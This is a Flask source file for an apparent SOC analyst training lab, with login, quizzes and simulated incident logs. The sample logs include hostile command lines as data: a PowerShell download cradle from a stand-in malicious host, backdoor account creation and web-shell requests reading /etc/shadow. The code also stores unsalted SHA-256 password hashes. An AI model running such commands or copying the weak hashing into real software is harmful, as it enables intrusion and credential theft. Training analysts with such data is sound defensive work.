import os
import logging
import hashlib
import sqlite3
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

from flask import Flask, render_template, request, jsonify, session, redirect
import json

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "fallback-dev-key-change-in-production")

# Database setup
DB_PATH = os.path.join(os.path.dirname(__file__), 'soclab.db')
is_vercel = os.environ.get('VERCEL', '') == '1'

def get_db():
    if is_vercel:
        return None
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    if is_vercel:
        return
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            name TEXT NOT NULL,
            age INTEGER NOT NULL,
            email TEXT NOT NULL,
            phone TEXT NOT NULL,
            soc_progress INTEGER DEFAULT 0,
            quiz_scores TEXT DEFAULT '{}',
            flagged TEXT DEFAULT '[]',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def load_user(username):
    if is_vercel:
        users = session.get('_site_users', {})
        return users.get(username)
    conn = get_db()
    row = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
    conn.close()
    if row:
        return dict(row)
    return None

def save_user(username, data):
    if is_vercel:
        users = session.get('_site_users', {})
        if username in users:
            users[username].update(data)
            session['_site_users'] = users
        return
    conn = get_db()
    conn.execute('''
        UPDATE users SET soc_progress = ?, quiz_scores = ?, flagged = ?
        WHERE username = ?
    ''', (data.get('soc_progress', 0), json.dumps(data.get('quiz_scores', {})),
          json.dumps(data.get('flagged', [])), username))
    conn.commit()
    conn.close()

def create_user(username, password_hash, name, age, email, phone):
    if is_vercel:
        users = session.get('_site_users', {})
        if username in users:
            return False
        users[username] = {
            'username': username,
            'password_hash': password_hash,
            'name': name,
            'age': age,
            'email': email,
            'phone': phone,
            'soc_progress': 0,
            'quiz_scores': '{}',
            'flagged': '[]'
        }
        session['_site_users'] = users
        return True
    conn = get_db()
    try:
        conn.execute('''
            INSERT INTO users (username, password_hash, name, age, email, phone)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (username, password_hash, name, age, email, phone))
        conn.commit()
        conn.close()
        return True
    except sqlite3.IntegrityError:
        conn.close()
        return False

def hash_password(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def load_session_from_user(username):
    data = load_user(username)
    if data:
        session['user_name'] = username
        session['soc_progress'] = data.get('soc_progress', 0)
        session['quiz_scores'] = json.loads(data.get('quiz_scores', '{}'))
        session['flagged'] = json.loads(data.get('flagged', '[]'))
    return data

def save_session_to_user(username):
    data = {
        'soc_progress': session.get('soc_progress', 0),
        'quiz_scores': session.get('quiz_scores', {}),
        'flagged': session.get('flagged', []),
    }
    save_user(username, data)

# SOC process flow sections
SOC_SECTIONS = ["Logs", "Alert", "Triage", "Investigation", "Response", "Recovery", "Report", "Improve"]
SOC_ROUTES = ["/logs", "/alert", "/triage", "/investigation", "/response", "/recovery", "/report", "/improve"]

# Production config from environment
app.config['SESSION_COOKIE_SECURE'] = os.getenv("SESSION_COOKIE_SECURE", "false").lower() == "true"
app.config['SESSION_COOKIE_HTTPONLY'] = os.getenv("SESSION_COOKIE_HTTPONLY", "true").lower() == "true"
app.config['SESSION_COOKIE_SAMESITE'] = os.getenv("SESSION_COOKIE_SAMESITE", "Lax")

# Logging
log_level = getattr(logging, os.getenv("LOG_LEVEL", "INFO").upper(), logging.INFO)
log_dir = os.getenv("LOG_DIR", "logs")
if not is_vercel:
    os.makedirs(log_dir, exist_ok=True)
    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", handlers=[logging.FileHandler(os.path.join(log_dir, "soclab.log")), logging.StreamHandler()])
else:
    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", handlers=[logging.StreamHandler()])
logger = logging.getLogger("soclab")

@app.before_request
def check_login():
    PROTECTED = ['/logs', '/alert', '/triage', '/investigation', '/response', '/recovery', '/report', '/improve', '/complete_section', '/reset_progress']
    path = request.path
    if any(path.startswith(p) for p in PROTECTED):
        if 'user_name' not in session:
            return redirect('/login')

SAMPLE_DATA = {
    "windows_events": [
        {"id": 4624, "time": "2026-06-15 08:12:34", "source": "Security", "user": "Administrator", "event": "Account Logon", "details": "Successful logon - admin@CORP", "severity": "info", "suspicious": False},
        {"id": 4625, "time": "2026-06-15 08:15:22", "source": "Security", "user": "unknown", "event": "Failed Logon", "details": "Failed logon for user 'admin' from IP 192.168.1.50 - bad password", "severity": "warning", "suspicious": True},
        {"id": 4625, "time": "2026-06-15 08:15:45", "source": "Security", "user": "unknown", "event": "Failed Logon", "details": "Failed logon for user 'admin' from IP 192.168.1.50 - bad password", "severity": "warning", "suspicious": True},
        {"id": 4625, "time": "2026-06-15 08:16:10", "source": "Security", "user": "unknown", "event": "Failed Logon", "details": "Failed logon for user 'admin' from IP 192.168.1.50 - bad password", "severity": "warning", "suspicious": True},
        {"id": 4625, "time": "2026-06-15 08:16:33", "source": "Security", "user": "unknown", "event": "Failed Logon", "details": "Failed logon for user 'root' from IP 192.168.1.50 - account does not exist", "severity": "warning", "suspicious": True},
        {"id": 4625, "time": "2026-06-15 08:17:01", "source": "Security", "user": "unknown", "event": "Failed Logon", "details": "Failed logon for user 'admin' from IP 192.168.1.50 - bad password", "severity": "warning", "suspicious": True},
        {"id": 4720, "time": "2026-06-15 09:00:12", "source": "Security", "user": "Administrator", "event": "User Created", "details": "New user 'backup_admin' created by Administrator", "severity": "info", "suspicious": True},
        {"id": 4722, "time": "2026-06-15 09:05:00", "source": "Security", "user": "Administrator", "event": "User Enabled", "details": "User 'backup_admin' was enabled", "severity": "info", "suspicious": True},
        {"id": 4732, "time": "2026-06-15 09:10:22", "source": "Security", "user": "Administrator", "event": "Group Member Added", "details": "'backup_admin' added to Administrators group", "severity": "high", "suspicious": True},
        {"id": 4688, "time": "2026-06-15 09:15:44", "source": "Security", "user": "backup_admin", "event": "Process Created", "details": "Process: cmd.exe, Command: net user hacker Password123! /add", "severity": "critical", "suspicious": True},
        {"id": 4688, "time": "2026-06-15 09:16:10", "source": "Security", "user": "backup_admin", "event": "Process Created", "details": "Process: powershell.exe, Command: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')", "severity": "critical", "suspicious": True},
        {"id": 4688, "time": "2026-06-15 09:20:00", "source": "Security", "user": "backup_admin", "event": "Process Created", "details": "Process: wscript.exe, Command: C:\\Users\\backup_admin\\AppData\\Local\\Temp\\malware.vbs", "severity": "critical", "suspicious": True},
        {"id": 5156, "time": "2026-06-15 09:25:30", "source": "Security", "user": "SYSTEM", "event": "Connection Established", "details": "Outbound TCP connection to 34.253.159.159:4444 from 10.10.10.5:49152", "severity": "high", "suspicious": True},
        {"id": 4657, "time": "2026-06-15 09:30:15", "source": "Security", "user": "backup_admin", "event": "Registry Modified", "details": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess modified for persistence", "severity": "high", "suspicious": True},
        {"id": 1102, "time": "2026-06-15 10:00:00", "source": "Security", "user": "backup_admin", "event": "Audit Log Cleared", "details": "The audit log was cleared by backup_admin", "severity": "critical", "suspicious": True},
    ],
    "web_logs": [
        {"ip": "192.168.1.50", "time": "2026-06-15 08:00:00", "method": "GET", "url": "/", "status": 200, "size": 1234, "user_agent": "Mozilla/5.0", "severity": "info"},
        {"ip": "192.168.1.50", "time": "2026-06-15 08:00:05", "method": "GET", "url": "/wp-admin", "status": 404, "size": 567, "user_agent": "Mozilla/5.0", "severity": "info"},
        {"ip": "192.168.1.50", "time": "2026-06-15 08:00:08", "method": "GET", "url": "/wp-login.php", "status": 200, "size": 890, "user_agent": "Mozilla/5.0", "severity": "info"},
        {"ip": "192.168.1.50", "time": "2026-06-15 08:00:12", "method": "POST", "url": "/wp-login.php", "status": 302, "size": 345, "user_agent": "Mozilla/5.0", "severity": "info"},
        {"ip": "92.168.1.50", "time": "2026-06-15 08:01:00", "method": "GET", "url": "/admin", "status": 403, "size": 234, "user_agent": "python-requests/2.28", "severity": "warning"},
        {"ip": "10.10.10.50", "time": "2026-06-15 08:05:00", "method": "GET", "url": "/../etc/passwd", "status": 200, "size": 4567, "user_agent": "curl/7.88", "severity": "critical", "suspicious": True},
        {"ip": "10.10.10.50", "time": "2026-06-15 08:05:02", "method": "GET", "url": "/../etc/shadow", "status": 403, "size": 123, "user_agent": "curl/7.88", "severity": "high", "suspicious": True},
        {"ip": "10.10.10.50", "time": "2026-06-15 08:05:05", "method": "GET", "url": "/admin%20config.php", "status": 404, "size": 234, "user_agent": "curl/7.88", "severity": "warning", "suspicious": True},
        {"ip": "45.33.32.156", "time": "2026-06-15 08:10:00", "method": "GET", "url": "/index.php?page=../../../../../etc/passwd", "status": 200, "size": 5678, "user_agent": "sqlmap/1.7", "severity": "critical", "suspicious": True},
        {"ip": "45.33.32.156", "time": "2026-06-15 08:10:03", "method": "GET", "url": "/index.php?id=1%27%20OR%20%271%27%3D%271", "status": 200, "size": 8901, "user_agent": "sqlmap/1.7", "severity": "critical", "suspicious": True},
        {"ip": "45.33.32.156", "time": "2026-06-15 08:10:06", "method": "GET", "url": "/index.php?id=1%20UNION%20SELECT%201,2,3,4", "status": 200, "size": 12345, "user_agent": "sqlmap/1.7", "severity": "critical", "suspicious": True},
        {"ip": "203.0.113.5", "time": "2026-06-15 08:15:00", "method": "POST", "url": "/upload.php", "status": 200, "size": 234, "user_agent": "Mozilla/5.0", "severity": "high", "suspicious": True},
        {"ip": "203.0.113.5", "time": "2026-06-15 08:15:02", "method": "GET", "url": "/uploads/shell.php", "status": 200, "size": 4567, "user_agent": "Mozilla/5.0", "severity": "critical", "suspicious": True},
        {"ip": "198.51.100.7", "time": "2026-06-15 08:20:00", "method": "GET", "url": "/.env", "status": 200, "size": 3456, "user_agent": "curl/7.88", "severity": "high", "suspicious": True},
        {"ip": "198.51.100.7", "time": "2026-06-15 08:20:02", "method": "GET", "url": "/wp-config.php.bak", "status": 200, "size": 5678, "user_agent": "curl/7.88", "severity": "high", "suspicious": True},
        {"ip": "10.10.10.50", "time": "2026-06-15 09:00:00", "method": "GET", "url": "/shell.php?cmd=id", "status": 200, "size": 123, "user_agent": "Mozilla/5.0", "severity": "critical", "suspicious": True},
        {"ip": "10.10.10.50", "time": "2026-06-15 09:00:05", "method": "GET", "url": "/shell.php?cmd=whoami", "status": 200, "size": 45, "user_agent": "Mozilla/5.0", "severity": "critical", "suspicious": True},
        {"ip": "10.10.10.50", "time": "2026-06-15 09:00:10", "method": "GET", "url": "/shell.php?cmd=cat%20/etc/shadow", "status": 200, "size": 2345, "user_agent": "Mozilla/5.0", "severity": "critical", "suspicious": True},
    ],
    "firewall_logs": [
        {"time": "2026-06-15 07:00:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49152, "dst_ip": "203.0.113.5", "dst_port": 80, "action": "ALLOW", "rule": "Allow HTTP Outbound", "severity": "info"},
        {"time": "2026-06-15 07:05:00", "protocol": "TCP", "src_ip": "192.168.1.50", "src_port": 49153, "dst_ip": "34.253.159.159", "dst_port": 22, "action": "BLOCK", "rule": "Block SSH Outbound", "severity": "warning"},
        {"time": "2026-06-15 07:10:00", "protocol": "TCP", "src_ip": "45.33.32.156", "src_port": 54321, "dst_ip": "10.10.10.5", "dst_port": 80, "action": "ALLOW", "rule": "Allow HTTP Inbound", "severity": "info"},
        {"time": "2026-06-15 07:10:01", "protocol": "TCP", "src_ip": "45.33.32.156", "src_port": 54322, "dst_ip": "10.10.10.5", "dst_port": 443, "action": "ALLOW", "rule": "Allow HTTPS Inbound", "severity": "info"},
        {"time": "2026-06-15 07:15:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49154, "dst_ip": "34.253.159.159", "dst_port": 4444, "action": "ALLOW", "rule": "Custom Rule - Dev Access", "severity": "high", "suspicious": True},
        {"time": "2026-06-15 07:20:00", "protocol": "TCP", "src_ip": "34.253.159.159", "src_port": 4444, "dst_ip": "10.10.10.50", "dst_port": 49155, "action": "ALLOW", "rule": "Custom Rule - Dev Access (Return)", "severity": "high", "suspicious": True},
        {"time": "2026-06-15 08:00:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49156, "dst_ip": "34.253.159.159", "dst_port": 9999, "action": "ALLOW", "rule": "Custom Rule - Monitoring", "severity": "critical", "suspicious": True},
        {"time": "2026-06-15 08:30:00", "protocol": "UDP", "src_ip": "10.10.10.50", "src_port": 5353, "dst_ip": "10.10.10.255", "dst_port": 5353, "action": "ALLOW", "rule": "Allow mDNS", "severity": "info"},
        {"time": "2026-06-15 08:45:00", "protocol": "ICMP", "src_ip": "45.33.32.156", "src_port": 0, "dst_ip": "10.10.10.5", "dst_port": 0, "action": "ALLOW", "rule": "Allow ICMP", "severity": "info"},
        {"time": "2026-06-15 09:00:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49157, "dst_ip": "185.220.101.1", "dst_port": 9050, "action": "ALLOW", "rule": "Custom Rule - Tor Access", "severity": "critical", "suspicious": True},
        {"time": "2026-06-15 09:15:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49158, "dst_ip": "34.253.159.159", "dst_port": 22, "action": "BLOCK", "rule": "Block SSH Outbound", "severity": "warning"},
        {"time": "2026-06-15 09:30:00", "protocol": "TCP", "src_ip": "45.33.32.156", "src_port": 54323, "dst_ip": "10.10.10.5", "dst_port": 3306, "action": "BLOCK", "rule": "Block MySQL External", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 09:30:01", "protocol": "TCP", "src_ip": "45.33.32.156", "src_port": 54324, "dst_ip": "10.10.10.5", "dst_port": 3306, "action": "BLOCK", "rule": "Block MySQL External", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 09:30:02", "protocol": "TCP", "src_ip": "45.33.32.156", "src_port": 54325, "dst_ip": "10.10.10.5", "dst_port": 3306, "action": "BLOCK", "rule": "Block MySQL External", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 10:00:00", "protocol": "TCP", "src_ip": "10.10.10.50", "src_port": 49159, "dst_ip": "34.253.159.159", "dst_port": 80, "action": "ALLOW", "rule": "Allow HTTP Outbound", "severity": "info"},
    ],
    "ssh_logs": [
        {"time": "2026-06-15 06:00:00", "host": "websrv-01", "user": "ubuntu", "src_ip": "10.10.10.100", "event": "Accepted password", "details": "Successful SSH login from 10.10.10.100", "severity": "info"},
        {"time": "2026-06-15 06:05:00", "host": "websrv-01", "user": "root", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'root' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:05:01", "host": "websrv-01", "user": "admin", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'admin' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:05:02", "host": "websrv-01", "user": "root", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'root' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:05:03", "host": "websrv-01", "user": "admin", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'admin' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:05:04", "host": "websrv-01", "user": "oracle", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'oracle' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:05:05", "host": "websrv-01", "user": "root", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'root' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:10:00", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'stansimon' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:10:01", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'stansimon' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:10:02", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'stansimon' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:10:03", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'stansimon' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:10:04", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Failed password", "details": "Failed SSH login - user 'stansimon' from 45.33.32.156", "severity": "warning", "suspicious": True},
        {"time": "2026-06-15 06:15:00", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "Accepted password", "details": "Successful SSH login from 45.33.32.156 - user stansimon", "severity": "critical", "suspicious": True},
        {"time": "2026-06-15 07:00:00", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "session opened", "details": "SSH session opened for user stansimon from 45.33.32.156", "severity": "info"},
        {"time": "2026-06-15 09:00:00", "host": "websrv-01", "user": "stansimon", "src_ip": "45.33.32.156", "event": "session closed", "details": "SSH session closed for user stansimon", "severity": "info"},
    ],
    "sysmon_logs": [
        {"id": 1, "time": "2026-06-15 08:00:00", "host": "CORP-WS-01", "event": "Process Creation", "details": "cmd.exe (PID: 1234) created by explorer.exe (PID: 1111) - User: Administrator", "severity": "info"},
        {"id": 3, "time": "2026-06-15 08:05:00", "host": "CORP-WS-01", "event": "Network Connection", "details": "svchost.exe (PID: 567) connected to 40.126.32.14:443 (Windows Update)", "severity": "info"},
        {"id": 1, "time": "2026-06-15 09:00:00", "host": "CORP-WS-01", "event": "Process Creation", "details": "powershell.exe (PID: 2345) created by cmd.exe (PID: 1234) - User: backup_admin", "severity": "high", "suspicious": True},
        {"id": 3, "time": "2026-06-15 09:02:00", "host": "CORP-WS-01", "event": "Network Connection", "details": "powershell.exe (PID: 2345) connected to 34.253.159.159:4444", "severity": "critical", "suspicious": True},
        {"id": 1, "time": "2026-06-15 09:03:00", "host": "CORP-WS-01", "event": "Process Creation", "details": "wscript.exe (PID: 3456) created by cmd.exe (PID: 1234) - User: backup_admin", "severity": "high", "suspicious": True},
        {"id": 11, "time": "2026-06-15 09:05:00", "host": "CORP-WS-01", "event": "File Created", "details": "File: C:\\Users\\backup_admin\\AppData\\Local\\Temp\\malware.vbs created by wscript.exe", "severity": "high", "suspicious": True},
        {"id": 1, "time": "2026-06-15 09:10:00", "host": "CORP-WS-01", "event": "Process Creation", "details": "rundll32.exe (PID: 4567) created by svchost.exe (PID: 567) - User: SYSTEM", "severity": "info"},
        {"id": 3, "time": "2026-06-15 09:10:01", "host": "CORP-WS-01", "event": "Network Connection", "details": "rundll32.exe (PID: 4567) connected to 185.220.101.1:9050 (Tor network)", "severity": "critical", "suspicious": True},
        {"id": 7, "time": "2026-06-15 09:15:00", "host": "CORP-WS-01", "event": "Image Loaded", "details": "powershell.exe loaded C:\\Users\\backup_admin\\AppData\\Local\\Temp\\reflective.dll", "severity": "critical", "suspicious": True},
        {"id": 15, "time": "2026-06-15 09:20:00", "host": "CORP-WS-01", "event": "Registry Modified", "details": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousBackdoor added by powershell.exe", "severity": "critical", "suspicious": True},
        {"id": 1, "time": "2026-06-15 09:25:00", "host": "CORP-WS-01", "event": "Process Creation", "details": "net.exe (PID: 5678) created by cmd.exe (PID: 1234) - User: Administrator", "severity": "warning"},
        {"id": 1, "time": "2026-06-15 09:25:02", "host": "CORP-WS-01", "event": "Process Creation", "details": "net1.exe (PID: 6789) created by net.exe (PID: 5678) - args: localgroup Administrators hacker /add", "severity": "critical", "suspicious": True},
        {"id": 3, "time": "2026-06-15 09:30:00", "host": "CORP-WS-01", "event": "Network Connection", "details": "powershell.exe (PID: 2345) connected to 34.253.159.159:9999 (C2 Beacon)", "severity": "critical", "suspicious": True},
        {"id": 11, "time": "2026-06-15 09:35:00", "host": "CORP-WS-01", "event": "File Created", "details": "File: C:\\Users\\Public\\exfil_data.zip created by cmd.exe", "severity": "high", "suspicious": True},
        {"id": 3, "time": "2026-06-15 09:40:00", "host": "CORP-WS-01", "event": "Network Connection", "details": "powershell.exe (PID: 2345) uploaded data to 34.253.159.159:80 (Data Exfiltration)", "severity": "critical", "suspicious": True},
    ],
    "quizzes": [
        {
            "q": "What Event ID indicates a successful Windows logon?",
            "options": ["4624", "4625", "4720", "4688"],
            "answer": 0,
            "explanation": "Event ID 4624 indicates a successful account logon. 4625 is failed logon, 4720 is user created, 4688 is process created."
        },
        {
            "q": "What HTTP status code means 'Not Found'?",
            "options": ["200", "302", "403", "404"],
            "answer": 3,
            "explanation": "404 means the requested resource was not found on the server."
        },
        {
            "q": "What type of log would you check for authentication failures?",
            "options": ["Application Logs", "Security Logs", "System Logs", "Setup Logs"],
            "answer": 1,
            "explanation": "Security Logs contain authentication and authorization events."
        },
        {
            "q": "What does a 403 HTTP status code indicate?",
            "options": ["OK", "Not Found", "Forbidden", "Internal Server Error"],
            "answer": 2,
            "explanation": "403 Forbidden means the server understood the request but refuses to authorize it."
        },
        {
            "q": "In the URL '?page=../../etc/passwd', what attack is likely being attempted?",
            "options": ["SQL Injection", "XSS", "Path Traversal", "CSRF"],
            "answer": 2,
            "explanation": "Path Traversal (Directory Traversal) uses '../' sequences to access files outside the web root."
        },
        {
            "q": "What Event ID indicates a user account was created in Windows?",
            "options": ["4624", "4625", "4720", "5156"],
            "answer": 2,
            "explanation": "Event ID 4720 is logged when a new user account is created."
        },
        {
            "q": "What protocol is commonly used for syslog?",
            "options": ["TCP", "UDP", "ICMP", "ARP"],
            "answer": 1,
            "explanation": "Syslog typically uses UDP port 514 for sending log messages."
        },
        {
            "q": "What is the default port for HTTPS?",
            "options": ["80", "443", "22", "8080"],
            "answer": 1,
            "explanation": "HTTPS uses port 443 by default, while HTTP uses port 80."
        },
        {
            "q": "After finding suspicious logs, what is a good first step?",
            "options": ["Ignore them", "Correlate with other log sources", "Delete the logs", "Reboot the server"],
            "answer": 1,
            "explanation": "Correlation across different log sources (endpoint, network, web) builds a complete picture of an incident."
        },
        {
            "q": "What might repeated failed logon events (Event ID 4625) indicate?",
            "options": ["Brute force attack", "Normal user activity", "Server maintenance", "Software update"],
            "answer": 0,
            "explanation": "Multiple rapid failed logon attempts from the same source indicate a brute force password attack."
        },
    ]
}

def get_log_stats():
    stats = {"total_events": 0, "by_severity": {"info": 0, "warning": 0, "high": 0, "critical": 0}, "suspicious": 0, "by_type": {}}
    all_logs = {"Windows Events": SAMPLE_DATA["windows_events"], "Web Logs": SAMPLE_DATA["web_logs"], "Firewall Logs": SAMPLE_DATA["firewall_logs"], "SSH Logs": SAMPLE_DATA["ssh_logs"], "Sysmon Logs": SAMPLE_DATA["sysmon_logs"]}
    for log_type, logs in all_logs.items():
        stats["by_type"][log_type] = {"count": len(logs), "suspicious": 0, "critical": 0}
        for entry in logs:
            stats["total_events"] += 1
            sev = entry.get("severity", "info")
            stats["by_severity"][sev] = stats["by_severity"].get(sev, 0) + 1
            if entry.get("suspicious"):
                stats["suspicious"] += 1
                stats["by_type"][log_type]["suspicious"] += 1
            if sev == "critical":
                stats["by_type"][log_type]["critical"] += 1
    return stats

# Section quizzes — 2 questions per section, must answer correctly to proceed
SECTION_QUIZZES = {
    0: [  # Logs
        {"q": "Which log source would you check for authentication failures?", "options": ["Firewall logs", "Windows Security logs", "Web server logs", "Sysmon logs"], "answer": 1},
        {"q": "What is the first step when reviewing logs in a SOC?", "options": ["Delete irrelevant logs", "Look for known-bad patterns and anomalies", "Backup all logs", "Report to management"], "answer": 1},
    ],
    1: [  # Alert
        {"q": "What makes an event an 'alert' in a SOC?", "options": ["It appears in the log file", "It matches a suspicious pattern or rule", "An analyst manually flags it", "It has a timestamp"], "answer": 1},
        {"q": "Which severity level requires immediate attention?", "options": ["Info", "Warning", "High", "Critical"], "answer": 3},
    ],
    2: [  # Triage
        {"q": "What does 'True Positive' (TP) mean in triage?", "options": ["The alert is a real security threat", "The alert is a false alarm", "The alert needs more investigation", "The alert was ignored"], "answer": 0},
        {"q": "What is the purpose of triage?", "options": ["To fix the vulnerability", "To prioritize and classify alerts quickly", "To generate a report", "To delete false positives"], "answer": 1},
    ],
    3: [  # Investigation
        {"q": "What is an IOC (Indicator of Compromise)?", "options": ["A security control", "Evidence of a potential breach", "A type of firewall rule", "A log format"], "answer": 1},
        {"q": "Why is timeline correlation important in investigation?", "options": ["It makes logs look organized", "It connects events across sources to build the attack story", "It reduces false positives", "It automatically blocks attackers"], "answer": 1},
    ],
    4: [  # Response
        {"q": "What is the first priority in incident response?", "options": ["Find the attacker", "Contain the breach", "Delete malicious files", "Reset all passwords"], "answer": 1},
        {"q": "Which action is part of eradication?", "options": ["Isolate the system", "Remove malware from affected systems", "Restore from backup", "Generate report"], "answer": 1},
    ],
    5: [  # Recovery
        {"q": "What is the goal of the recovery phase?", "options": ["Catch the attacker", "Restore normal operations safely", "Delete old logs", "Update firewall rules"], "answer": 1},
        {"q": "Why should passwords be rotated during recovery?", "options": ["It's standard procedure", "Credentials may have been compromised", "Management requires it", "To test the helpdesk"], "answer": 1},
    ],
    6: [  # Report
        {"q": "What should an incident report include?", "options": ["Only the attacker's IP", "Timeline, findings, actions taken, and recommendations", "A list of all log entries", "Personal opinions"], "answer": 1},
        {"q": "Who is the primary audience for an incident report?", "options": ["The attacker", "Stakeholders and management", "Only the SOC team", "External media"], "answer": 1},
    ],
    7: [  # Improve
        {"q": "What is the purpose of the 'Improve' phase?", "options": ["To blame someone for the incident", "To identify gaps and implement better defenses", "To close the case", "To reward the SOC team"], "answer": 1},
        {"q": "What should be done with lessons learned?", "options": ["File them away", "Implement changes to prevent recurrence", "Share them with other attackers", "Ignore them"], "answer": 1},
    ],
}

def get_section_score(step):
    """Get number of correct answers for a section quiz."""
    scores = session.get('quiz_scores', {})
    return scores.get(str(step), 0)

@app.route('/quiz/<int:step>', methods=['POST'])
def check_quiz(step):
    data = request.json
    answers = data.get('answers', [])
    quiz = SECTION_QUIZZES.get(step, [])
    correct = 0
    total = len(quiz)
    for i, ans in enumerate(answers):
        if i < len(quiz) and ans == quiz[i]['answer']:
            correct += 1
    scores = session.get('quiz_scores', {})
    scores[str(step)] = correct
    session['quiz_scores'] = scores
    save_session_to_user(session.get('user_name', ''))
    return jsonify({"correct": correct, "total": total, "passed": correct == total})

def get_progress():
    return session.get('soc_progress', 0)

def require_progress(step):
    """Redirect if user hasn't completed the prerequisite step."""
    prog = get_progress()
    if prog < step:
        return True  # needs redirect
    return False

@app.context_processor
def inject_soc_progress():
    prog = get_progress()
    user = session.get('user_name', '')
    return dict(soc_progress=prog, SOC_SECTIONS=SOC_SECTIONS, SOC_ROUTES=SOC_ROUTES, now=datetime.now, user_name=user)

@app.route('/')
def index():
    if 'user_name' in session:
        return redirect('/logs')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_name' in session:
        return redirect('/logs')
    error = ''
    if request.method == 'POST':
        username = request.form.get('username', '').strip().lower()
        password = request.form.get('password', '')
        if not username or not password:
            error = 'Please fill in all fields.'
        else:
            user = load_user(username)
            if user and user.get('password_hash') == hash_password(password):
                load_session_from_user(username)
                return redirect('/logs')
            else:
                error = 'Invalid username or password.'
    return render_template('login.html', error=error)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if 'user_name' in session:
        return redirect('/logs')
    error = ''
    if request.method == 'POST':
        username = request.form.get('username', '').strip().lower()
        password = request.form.get('password', '')
        name = request.form.get('name', '').strip()
        age = request.form.get('age', '').strip()
        email = request.form.get('email', '').strip().lower()
        phone = request.form.get('phone', '').strip()
        if not username or not password or not name or not age or not email or not phone:
            error = 'All fields are required.'
        elif not age.isdigit() or int(age) < 1 or int(age) > 150:
            error = 'Please enter a valid age.'
        elif not email or '@' not in email or '.' not in email.split('@')[-1]:
            error = 'Please enter a valid email address (e.g. you@gmail.com).'
        elif not phone.startswith('+'):
            error = 'Phone number must include country code (e.g. +1 5551234).'
        else:
            created = create_user(username, hash_password(password), name, int(age), email, phone)
            if created:
                load_session_from_user(username)
                return redirect('/logs')
            else:
                error = 'Username already exists. Please choose another.'
    return render_template('register.html', error=error)

def get_all_events():
    all_events = []
    for key, label in [("windows_events", "Windows"), ("web_logs", "Web"), ("firewall_logs", "Firewall"), ("ssh_logs", "SSH"), ("sysmon_logs", "Sysmon")]:
        for e in SAMPLE_DATA[key]:
            e["source"] = label
            all_events.append(e)
    all_events.sort(key=lambda x: x.get("time", ""))
    return all_events

@app.route('/logs')
def logs_page():
    events = get_all_events()
    return render_template('logs_page.html', events=events, section_idx=0)

@app.route('/alert')
def alert_page():
    if require_progress(1):
        return render_template('locked.html', current_progress=get_progress(), section_name="Alert", needed_step=1)
    events = [e for e in get_all_events() if e.get("suspicious")]
    events.sort(key=lambda x: x.get("severity", ""))
    return render_template('alert.html', alerts=events, section_idx=1)

@app.route('/triage')
def triage_page():
    if require_progress(2):
        return render_template('locked.html', current_progress=get_progress(), section_name="Triage", needed_step=2)
    events = [e for e in get_all_events() if e.get("suspicious")]
    return render_template('triage.html', alerts=events, section_idx=2)

@app.route('/investigation')
def investigation_page():
    if require_progress(3):
        return render_template('locked.html', current_progress=get_progress(), section_name="Investigation", needed_step=3)
    return render_template('investigation.html', section_idx=3)

@app.route('/response')
